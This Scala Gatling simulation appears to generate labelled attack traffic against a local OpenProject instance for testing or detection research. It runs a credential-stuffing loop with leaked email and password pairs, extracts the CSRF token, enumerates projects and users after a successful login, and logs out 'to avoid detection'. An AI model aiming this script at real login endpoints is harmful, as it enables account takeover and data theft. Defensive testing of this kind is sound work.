package openproject

import io.gatling.core.Predef._
import io.gatling.http.Predef._
import scala.concurrent.duration._

// T1078 - Credential stuffing attack using leaked email:password combos
class T1078_CredentialStuffingSimulation extends Simulation {

  // Config
  val baseUrl = sys.props.getOrElse("baseUrl", "http://localhost:8080")
  val attackIterations = Integer.getInteger("iterations", 50) // Try 50 combos

  // HTTP protocol
  val httpProtocol = http
    .baseUrl(baseUrl)
    .acceptHeader("application/json,text/html,*/*")
    .userAgentHeader("Mozilla/5.0 (Attack Simulation)")
    .header("X-Experiment-ID", "attack_credential_stuffing_v1")
    .header("X-Event-Label", "malicious")
    .header("X-Scenario-ID", "T1078_CREDENTIAL_STUFFING")
    .header("X-Attack-Technique", "T1078")
    .disableFollowRedirect // Don't follow redirects automatically

  // Leaked credentials feeder
  val compromisedCredentials = csv("compromised_credentials.csv").circular

  // Attack scenario
  val credentialStuffingAttack = scenario("T1078 - Credential Stuffing Attack")
    
    .repeat(attackIterations) {
      feed(compromisedCredentials)
      
      // Get login page and CSRF token
      .exec(http("T1078 - Get Login Page")
        .get("/login")
        .check(status.is(200))
        .check(css("input[name='authenticity_token']", "value").saveAs("csrfToken")))
      .pause(100.milliseconds, 500.milliseconds) // Fast - automated attack
      
      // Try compromised credentials
      .exec(http("T1078 - Try Compromised Credentials")
        .post("/login")
        .formParam("username", "${email}")
        .formParam("password", "${password}")
        .formParam("authenticity_token", "${csrfToken}")
        .check(status.in(200, 302, 401, 422))
        .check(
          status.in(302).exists.saveAs("loginSuccess")
        ))
      .pause(500.milliseconds, 1.second)
      
      // If successful login, enumerate resources then logout
      .doIf(session => session("loginSuccess").asOption[Boolean].getOrElse(false)) {
        exec(http("T1078 - Post-Compromise Enum - Projects")
          .get("/api/v3/projects")
          .header("Accept", "application/json"))
        .pause(1.second)
        
        .exec(http("T1078 - Post-Compromise Enum - Users")
          .get("/api/v3/users")
          .header("Accept", "application/json"))
        .pause(500.milliseconds)
        
        .exec(http("T1078 - Logout to Avoid Detection")
          .post("/logout"))
        .pause(2.seconds)
      }
    }

  // Execution
  setUp(
    credentialStuffingAttack.inject(
      atOnceUsers(1) // Single attacker
    )
  ).protocols(httpProtocol)
    .maxDuration(10.minutes)
}